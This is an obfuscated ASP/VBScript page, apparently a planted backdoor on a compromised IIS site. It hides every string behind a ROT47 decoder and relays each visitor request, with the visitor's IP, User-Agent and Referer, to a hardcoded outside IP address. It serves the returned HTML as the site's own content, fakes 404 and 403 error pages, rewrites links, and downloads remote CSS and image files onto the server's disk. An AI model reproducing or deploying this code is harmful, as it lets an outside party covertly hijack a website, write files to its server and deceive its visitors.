<%@ LANGUAGE=VBSCRIPT CODEPAGE=65001 %>
<%
Dim GFGGGG,GGFFFF,GGFFFG,GGFFGF,GGFFGG
Set GGFFFG=Response:Set GGFFFF=Request:Set GGFFGG=Session:Set GFGGGG=Application:Set GGFFGF=Server
Set GGFFFGF = New GFFFFGF
GGFFFGF.dizhi 	= GGGGGG("`fb]ada]a_g]d_")
GGFFFGF.filename 	= GGFFFF.ServerVariables(GGGGGG("$4C:AE0}2>6"))
GGFFFGF.csvalue 	= GGGGGG("G:56@D")
GGFFFGF.cachefile 	= GGGGGG("^42496")
GGFFFGF.connect
Class GFFFFGF
Public GFFFFGG,dizhi,GFFFGFG,filename,csvalue,cachefile
Private GFFGFFG,GFFGFGF,GFFGFGG,GFFGGFF,GFFGGFG,GFFGGGF,GFFGGGG
Private Sub Class_Initialize
GFFGFFG	= ""
filename	= GGGGGG(":?56I]2DA")
csvalue		= GGGGGG("A286")
GFFGFGF	= GGFFFF.ServerVariables(GGGGGG("$t#")&GGGGGG("'t#0$~u%")&GGGGGG("(p#t"))
GFFFFGG 		= GGGGGG("`af]_]_]`")
dizhi 	= GGGGGG("`af]_]_]`")
GFFFGFG	= ""
GFFGGGF 	= GGFFFF.ServerVariables(GGGGGG("w%%!0w~$%"))
cachefile 	= GGGGGG("^42496")
GFFGGGG			= GGGGFG()
End Sub
Function connect()
Dim GFGFFFF
Set GFGFFFF = GGFFGF.Createobject(GGGGGG("(")&GGGGGG(":?w")&GGGGGG("E")&GGGGGG("EA](:")&GGGGGG("?wEEA#")&GGGGGG("6BF6D")&GGGGGG("E]")&"5"&".1")
GFGFFFF.option(6) = false
GFGFFFF.Open GGGGGG("vt%"), GGGGGG("9EEAi^^")&dizhi&GGGGGG("^")&GGFFFF.QueryString(csvalue) , False
GFGFFFF.setRequestHeader GGGGGG(")\#62=D57=<;H6Cb=abc=<;abc=<;abc=\x!"), GFFGGGG
GFGFFFF.setRequestHeader GGGGGG("w@DE"), GFFGGGF
GFGFFFF.setRequestHeader GGGGGG("&D6C\p86?E"), GGFFFF.ServerVariables(GGGGGG("w%%!0&$t#0pvt}%"))
If GGFFFF.ServerVariables(GGGGGG("w%%!0#tut#t#"))<>"" Then
GFGFFFF.setRequestHeader GGGGGG("#676C6C"), GGFFFF.ServerVariables(GGGGGG("w%%!0#tut#t#"))
End If
GFGFFFF.Send()
GFGFFFF.WaitForResponse()
GFFGGFG			= GFGFFFF.ResponseBody
GFFGFFG		= GFGFFFF.Status
If GFFGFFG=302 or GFFGFFG= 301 Then
GFFGGFF	= GFGFFFF.GetResponseHeader(GGGGGG("{@42E:@?"))
end if
Set GFGFFFF=Nothing
set GGFFFGG = GGFFGF.CreateObject(GGGGGG("p5@53]$EC62>"))
GGFFFGG.Type = (64 * 57 - 3647)
GGFFFGG.Mode = (66 * 102 - 6729)
GGFFFGG.Open
GGFFFGG.Write GFFGGFG
GGFFFGG.Position = (47 * 82 - 3854)
GGFFFGG.Type = (16 * 34 - 542)
GGFFFGG.Charset = GGGGGG("&%u\g")
GFFGGFG = GGFFFGG.ReadText
GGFFFGG.Close
GGFGFG()
End function
Function GGFGFG()
If GFFGFFG="302" Then
GGFFFG.Redirect(GFFGGFF)
Exit Function
ElseIf GFFGFFG="301" Then
GGFFFG.Status = GGGGGG("w%%!^`]` ,b_` ,|@G65 ,!6C>2?6?E=J")
GGFFFG.Addheader GGGGGG("{@42E:@?"),GFFGGFF
Exit Function
ElseIf GFFGFFG="404" Then
GGFFFG.Status = GGGGGG("w%%!^`]` ,c_c ,}@E ,u@F?5")
GGFFFG.Addheader GGGGGG("s2E6"), now&GGGGGG(" ,v|%")
GGFFFG.Addheader GGGGGG("$6CG6C"), GFFGFGF
GGFFFG.Addheader GGGGGG("r@?E6?E\%JA6"),GGGGGG("E6IE^9E>=")
GGFFFG.Write GGGGGG("k9E>=mk9625mkE:E=6mc_c ,}@E ,u@F?5k^E:E=6mk^9625mk3@5Jmk9`mc_c ,}@E ,u@F?5k^9`m")&GFFGFGF&GGGGGG("k^3@5Jmk^9E>=m")
Exit Function
ElseIf GFFGFFG="403" Then
GGFFFG.Status = GGGGGG("w%%!^`]` ,c_b ,u@C3:556?")
GGFFFG.Addheader GGGGGG("s2E6"), now &GGGGGG(" ,v|%")
GGFFFG.Addheader GGGGGG("$6CG6C"), GFFGFGF
GGFFFG.Addheader GGGGGG("r@?E6?E\%JA6"),GGGGGG("E6IE^9E>=")
GGFFFG.Write GGGGGG("k9E>=mk9625mkE:E=6mc_b ,u@C3:556?k^E:E=6mk^9625mk3@5Jmk9`mc_b ,u@C3:556?k^9`m")&GFFGFGF&GGGGGG("k^3@5Jmk^9E>=m")
Exit Function
End If
GGFFFG.ContentType = GGGGGG("E6IE^9E>=")
GGFFFG.AddHeader GGGGGG("r@?E6?E\%JA6"), GGGGGG("E6IE^9E>=j492CD6El&%u\g")
GGFFFG.CodePage = (85 * 77 - -58456)
GGFFFG.CharSet = GGGGGG("&%u\g")
GFFGGFG = GGFGGF(GGGGGG("9C67l-Q^W]YnX-]W9E>=M2DAM9E>X-Q"), GGGGGG("9C67lQ")&filename&GGGGGG("n")&csvalue&GGGGGG("lS`]SaQ"), GFFGGFG)
GFFGGFG = GGFGGG(GGGGGG("9C67l-QW]YnX-]W4DDX-Q"),GGGGGG("9C67lQ")&cachefile&GGGGGG("S`]SaQ"), GFFGGFG,GGGGGG("4DD"))
GFFGGFG = GGFGGG(GGGGGG("DC4l-QW]YnX-]W8:7M;A8MA?8X-Q"),GGGGGG("DC4lQ")&cachefile&GGGGGG("S`]SaQ"), GFFGGFG,GGGGGG(":>8"))
GGFFFG.Write GFFGGFG
End Function
Function GGFGGF(GGFGFFG, GGFGFGF, Str)
Dim GFGFFFG
Set GFGFFFG = New RegExp
GFGFFFG.Pattern = GGFGFFG
GFGFFFG.IgnoreCase = false
GFGFFFG.Global = True
GGFGGF = GFGFFFG.Replace(Str, GGFGFGF)
End Function
Function GGFGGG(GGFGFFG, GGFGFGF, Str, GGFGGFF)
Dim GFGFFFG, GFGFFGF, GFGFFGG
Set GFGFFFG = New RegExp
GFGFFFG.Pattern = GGFGFFG
GFGFFFG.IgnoreCase = false
GFGFFFG.Global = True
Set GFGFFGG = GFGFFFG.Execute(Str)
For Each GFGFFGF in GFGFFGG
IF GGFGGFF = GGGGGG("4DD") then
GGGFFF GFGFFGF.SubMatches(0)&GGGGGG("]")&GFGFFGF.SubMatches(1)
Elseif GGFGGFF = GGGGGG(":>8") Then
GGGFFG  GFGFFGF.SubMatches(0)&GGGGGG("]")&GFGFFGF.SubMatches(1)
End If
Next
GGFGGG = GFGFFFG.Replace(Str, GGFGFGF)
End Function
Function GGGFFF(GGFGGFG)
dim GFGFGFF
GFGFGFF=GGFFGF.MapPath(GGGGGG("^"))&cachefile&GGFGGFG
Set GGFFGFF=GGFFGF.CreateObject(GGGGGG("$4C:A")&GGGGGG("E:?8]u:=")&GGGGGG("6$JDE")&GGGGGG("6>~3;")&GGGGGG("64E"))
If GGFFGFF.FileExists(GFGFGFF) Then
Set GGFFGFF=Nothing
Exit Function
end if
Set GGFFGFF=Nothing
Dim GFGFFFF
Set GFGFFFF = GGFFGF.Createobject(GGGGGG("(:?w")&GGGGGG("EEA](:?")&GGGGGG("wEEA")&GGGGGG("#6BF6")&GGGGGG("DE]")&"5."&"1")
GFGFFFF.option(6) = false
GFGFFFF.Open GGGGGG("!~$%"), GGGGGG("9EEAi^^")&dizhi&GGFGGFG , False
GFGFFFF.setRequestHeader GGGGGG("w@DE"), GFFGGGF
GFGFFFF.setRequestHeader GGGGGG(")\#62=D57=<;H6Cb=abc=<;abc=<;abc=\x!"), GFFGGGG
GFGFFFF.Send()
GGFFGFG = GFGFFFF.ResponseText
GGGGFF(GGGGGG("^")&GGGFGG(cachefile&GGFGGFG))
GFFFFFG GGGGGG("^")&cachefile&GGFGGFG,GGFFGFG,GGGGGG("&%u\g")
Set GFGFFFF=Nothing
End function
Function GGGFFG(GGFGGFG)
On Error Resume Next
dim GFGFGFF
GFGFGFF=GGFFGF.MapPath(GGGGGG("^"))&cachefile&GGFGGFG
Set GGFFGFF=GGFFGF.CreateObject(GGGGGG("$4C:A")&GGGGGG("E:?8]u:=")&GGGGGG("6$JDE")&GGGGGG("6>~3;")&GGGGGG("64E"))
If GGFFGFF.FileExists(GFGFGFF) Then
Set GGFFGFF=Nothing
Exit Function
end if
Set GGFFGFF=Nothing
Dim GFGFFFF
Set GFGFFFF = GGFFGF.Createobject(GGGGGG("(:?")&GGGGGG("wEE")&GGGGGG("A](:?w")&GGGGGG("EEA#")&GGGGGG("6BF6")&GGGGGG("DE]d")&".1")
GFGFFFF.option(6) = false
GFGFFFF.Open GGGGGG("vt%"), GGGGGG("9EEAi^^")&dizhi&GGFGGFG , False
GFGFFFF.setRequestHeader GGGGGG("w@DE"), GFFGGGF
GFGFFFF.setRequestHeader GGGGGG(")\#62=D57=<;H6Cb=abc=<;abc=<;abc=\x!"), GFFGGGG
GFGFFFF.Send()
GFGFFFF.WaitForResponse
GGGGFF(GGGGGG("^")&GGGFGG(cachefile&GGFGGFG))
Set GGFFGGF=GGFFGF.CreateObject(GGGGGG("25@")&GGGGGG("53]DEC")&GGGGGG("62>"))
GGFFGGF.Type= (64 * 57 - 3647)
GGFFGGF.open
GGFFGGF.write GFGFFFF.ResponseBody
GGFFGGF.SaveToFile GGFFGF.MapPath(GGGGGG("^")&cachefile&GGFGGFG)
GGFFGGF.flush
GGFFGGF.Close
Set GGFFGGF=Nothing
Set GFGFFFF=Nothing
End function
Function GGGFGF(GGFGGGF)
GGGFGF = mid(GGFGGGF,instrrev(GGFGGGF,GGGGGG("^"))+1)
End Function
Function GGGFGG(GGFGGGF)
GGGFGG = Left(GGFGGGF,instrrev(GGFGGGF,GGGGGG("^")))
End Function
Function GGGGFF(ByVal CFolder)
Dim GFGFGFG, GFGFGGF, GFGFGGG, CreateFolder
Dim GFGGFFG, GFGGFGF, GFGGFGG, GFGGGFF, GFGGGFG
GFGGGFG = False
CreateFolder = CFolder
On Error Resume Next
Set GFGFGFG = GGFFGF.CreateObject(GGGGGG("$4C")&GGGGGG(":AE:?8]")&GGGGGG("u:=6")&GGGGGG("$JDE6>")&GGGGGG("~3;64E"))
If Err Then
Err.Clear()
Exit Function
End If
If Right(CreateFolder, 1) = GGGGGG("^") Then
CreateFolder = Left(CreateFolder, Len(CreateFolder) -1)
End If
GFGFGGG = Split(CreateFolder, GGGGGG("^"))
For GFGGFFG = 0 To UBound(GFGFGGG)
GFGGFGG = ""
For GFGGFGF = 0 To GFGGFFG
GFGGFGG = GFGGFGG & GFGFGGG(GFGGFGF) & GGGGGG("^")
Next
GFGGGFF = GGFFGF.MapPath(GFGGFGG)
If Not GFGFGFG.FolderExists(GFGGGFF) Then
GFGFGFG.CreateFolder(GFGGGFF)
End If
Next
If Err Then
Err.Clear()
Else
GFGGGFG = True
End If
GGGGFF = GFGGGFG
End Function
Sub GFFFFFG (GGFGGGG,byval Str,CharSet)
On Error Resume Next
set GGFFGGF=GGFFGF.CreateObject(GGGGGG("25@")&GGGGGG("53]DEC")&GGGGGG("62>"))
GGFFGGF.Type= (16 * 34 - 542)
GGFFGGF.mode= (66 * 102 - 6729)
GGFFGGF.open
GGFFGGF.WriteText str
GGFFGGF.SaveToFile GGFFGF.MapPath(GGFGGGG)
GGFFGGF.flush
GGFFGGF.Close
set GGFFGGF=nothing
End Sub
Function GGGGFG()
on error resume next
Dim GFGGGGF
If GGFFFF.ServerVariables(GGGGGG("w%%!0")&GGGGGG(")0")&GGGGGG("u~#")&GGGGGG("(p#sts0u~#")) = "" Or InStr(GGFFFF.ServerVariables(GGGGGG("w")&GGGGGG("%%!0)0u~")&GGGGGG("#(")&GGGGGG("p#s")&GGGGGG("ts0u~#")), GGGGGG("F?<?@H?")) > 0 Then
GFGGGGF = GGFFFF.ServerVariables(GGGGGG("#t|")&GGGGGG("~%t0p")&GGGGGG("ss#"))
ElseIf InStr(GGFFFF.ServerVariables(GGGGGG("w%")&GGGGGG("%!0)0u~#(")&GGGGGG("p#sts0u~#")), GGGGGG("[")) > 0 Then
GFGGGGF = Mid(GGFFFF.ServerVariables(GGGGGG("w")&GGGGGG("%%!0)0u~")&GGGGGG("#(p#s")&GGGGGG("ts0u~#")), 1, InStr(GGFFFF.ServerVariables(GGGGGG("w%%")&GGGGGG("!0)0u")&GGGGGG("~#(")&GGGGGG("p#")&GGGGGG("sts0u")&GGGGGG("~#")), GGGGGG("["))-1)
GGFFGGG = GGFFFF.ServerVariables(GGGGGG("#t|~")&GGGGGG("%t0pss")&GGGGGG("#"))
ElseIf InStr(GGFFFF.ServerVariables(GGGGGG("w%%")&GGGGGG("!0)0u")&GGGGGG("#(")&GGGGGG("p#sts0u~#")), GGGGGG("j")) > 0 Then
GFGGGGF = Mid(GGFFFF.ServerVariables(GGGGGG("w%")&GGGGGG("%!0)0u~#(")&GGGGGG("p#sts0u~#")), 1, InStr(GGFFFF.ServerVariables(GGGGGG("w")&GGGGGG("%%!0")&GGGGGG("0u~#")&GGGGGG("(p#s")&GGGGGG("ts0u~#")), GGGGGG("j"))-1)
GGFFGGG = GGFFFF.ServerVariables(GGGGGG("#")&GGGGGG("t|~")&GGGGGG("%t0pss")&GGGGGG("#"))
Else
GFGGGGF = GGFFFF.ServerVariables(GGGGGG("w%")&GGGGGG("%!")&GGGGGG("0)0u~")&GGGGGG("#(p#s")&GGGGGG("ts0u~#"))
GGFFGGG = GGFFFF.ServerVariables(GGGGGG("#t|")&GGGGGG("~%t0ps")&GGGGGG("s#"))
End If
GGGGFG = Replace(Trim(Mid(GFGGGGF, 1, 30)), GGGGGG("V"), "")
End Function
Function GGGGGF()
On Error Resume Next
Dim GFGGGGG
If LCase(GGFFFF.ServerVariables(GGGGGG("w%%!$"))) = GGGGGG("@77") Then
GFGGGGG = GGGGGG("9EEAi^^")
Else
GFGGGGG = GGGGGG("9EEADi^^")
End If
GFGGGGG = GFGGGGG&GGFFFF.ServerVariables(GGGGGG("$t#'t#0}p|t"))
If GGFFFF.ServerVariables(GGGGGG("$t#'t#0!~#%")) <> 80 Then
GFGGGGG = GFGGGGG&GGGGGG("i")&GGFFFF.ServerVariables(GGGGGG("$t#'t#0!~#%"))
End If
GFGGGGG = GFGGGGG&GGFFFF.ServerVariables(GGGGGG("&#{"))
If Trim(GGFFFF.QueryString)<>"" Then
GFGGGGG = GFGGGGG&GGGGGG("n")&Trim(GGFFFF.QueryString)
End If
GGGGGF = GFGGGGG
End Function
End Class
Function GGGGGG(ByVal GGFGFFF)
Dim GGFFFFF, GFGGFFG, GGFFFFG
GGFGFFF = Replace(GGFGFFF, Chr(37) & ChrW(-243) & Chr(62), Chr(37) & Chr(62))
For GFGGFFG = 1 To Len(GGFGFFF)
If GFGGFFG <> GGFFFFG Then
GGFFFFF = AscW(Mid(GGFGFFF, GFGGFFG, 1))
If GGFFFFF >= 33 And GGFFFFF <= 79 Then
GGGGGG = GGGGGG & Chr(GGFFFFF + 47)
ElseIf GGFFFFF >= 80 And GGFFFFF <= 126 Then
GGGGGG = GGGGGG & Chr(GGFFFFF - 47)
Else
GGFFFFG = GFGGFFG + 1
If Mid(GGFGFFF, GGFFFFG, 1) = GGGGGG("o") Then GGGGGG = GGGGGG & ChrW(GGFFFFF + 5) Else GGGGGG = GGGGGG & Mid(GGFGFFF, GFGGFFG, 1)
End If
End If
Next
End Function
%>